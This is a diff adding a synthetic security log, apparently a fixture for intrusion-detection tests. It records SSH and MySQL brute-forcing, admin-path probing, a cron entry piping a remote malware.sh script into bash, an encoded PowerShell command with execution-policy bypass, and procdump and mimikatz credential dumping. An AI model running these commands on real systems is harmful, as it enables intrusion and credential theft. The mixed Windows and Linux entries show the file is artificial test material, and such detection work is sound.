@@ -1,0 +1,32 @@
+Jan 15 10:00:01 webserver01 sshd[12345]: Failed password for invalid user admin from 45.33.32.156 port 43210 ssh2
+Jan 15 10:00:03 webserver01 sshd[12345]: Failed password for invalid user root from 45.33.32.156 port 43211 ssh2
+Jan 15 10:00:05 webserver01 sshd[12345]: Failed password for invalid user ubuntu from 45.33.32.156 port 43212 ssh2
+Jan 15 10:00:07 webserver01 sshd[12345]: Failed password for invalid user pi from 45.33.32.156 port 43213 ssh2
+Jan 15 10:00:09 webserver01 sshd[12345]: Failed password for invalid user oracle from 45.33.32.156 port 43214 ssh2
+Jan 15 10:00:11 webserver01 sshd[12345]: Failed password for invalid user postgres from 45.33.32.156 port 43215 ssh2
+Jan 15 10:00:13 webserver01 sshd[12345]: Failed password for invalid user mysql from 45.33.32.156 port 43216 ssh2
+Jan 15 10:00:15 webserver01 sshd[12345]: Failed password for invalid user test from 45.33.32.156 port 43217 ssh2
+Jan 15 10:00:17 webserver01 sshd[12345]: Failed password for invalid user user from 45.33.32.156 port 43218 ssh2
+Jan 15 10:00:19 webserver01 sshd[12345]: Failed password for invalid user deploy from 45.33.32.156 port 43219 ssh2
+Jan 15 10:01:00 webserver01 sudo[23456]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
+Jan 15 10:01:05 webserver01 sudo[23457]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id
+Jan 15 10:02:00 webserver01 kernel: [12345.678901] audit: type=1400 avc: denied { execve } for pid=9876 path="/tmp/shell" dev=sda1
+Jan 15 10:03:00 webserver01 auditd[1234]: type=EXECVE msg=audit(1705312980.000:500): argc=5 a0="powershell" a1="-ExecutionPolicy" a2="Bypass" a3="-encodedcommand" a4="aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA=="
+Jan 15 10:04:00 webserver01 cron[5678]: (root) CMD (curl http://198.51.100.99/malware.sh | bash)
+Jan 15 10:05:00 webserver01 sshd[34567]: Accepted publickey for deploy from 10.0.0.5 port 22334 ssh2
+Jan 15 10:06:00 appserver02 sshd[44444]: Failed password for root from 203.0.113.88 port 11111 ssh2
+Jan 15 10:06:02 appserver02 sshd[44444]: Failed password for root from 203.0.113.88 port 11112 ssh2
+Jan 15 10:06:04 appserver02 sshd[44444]: Failed password for root from 203.0.113.88 port 11113 ssh2
+Jan 15 10:06:06 appserver02 sshd[44444]: Failed password for root from 203.0.113.88 port 11114 ssh2
+Jan 15 10:06:08 appserver02 sshd[44444]: Failed password for root from 203.0.113.88 port 11115 ssh2
+Jan 15 10:07:00 dbserver01 mysqld[55555]: Access denied for user 'root'@'192.168.100.50' (using password: YES)
+Jan 15 10:07:01 dbserver01 mysqld[55555]: Access denied for user 'root'@'192.168.100.50' (using password: YES)
+Jan 15 10:07:02 dbserver01 mysqld[55555]: Access denied for user 'root'@'192.168.100.50' (using password: YES)
+Jan 15 10:07:03 dbserver01 mysqld[55555]: Access denied for user 'admin'@'192.168.100.50' (using password: YES)
+Jan 15 10:07:04 dbserver01 mysqld[55555]: Access denied for user 'admin'@'192.168.100.50' (using password: YES)
+Jan 15 10:07:05 dbserver01 mysqld[55555]: Access denied for user 'sa'@'192.168.100.50' (using password: YES)
+Jan 15 10:08:00 webserver01 apache2: 192.168.100.50 - - [15/Jan/2024:10:08:00 +0000] "GET /admin HTTP/1.1" 404 512
+Jan 15 10:08:01 webserver01 apache2: 192.168.100.50 - - [15/Jan/2024:10:08:01 +0000] "GET /wp-admin HTTP/1.1" 404 512
+Jan 15 10:08:02 webserver01 apache2: 192.168.100.50 - - [15/Jan/2024:10:08:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 512
+Jan 15 10:09:00 fileserver01 kernel: lsass.exe accessed by procdump.exe - credential dumping attempt detected
+Jan 15 10:10:00 fileserver01 sysmon: mimikatz detected - sekurlsa::logonpasswords executed by user CORP\jsmith
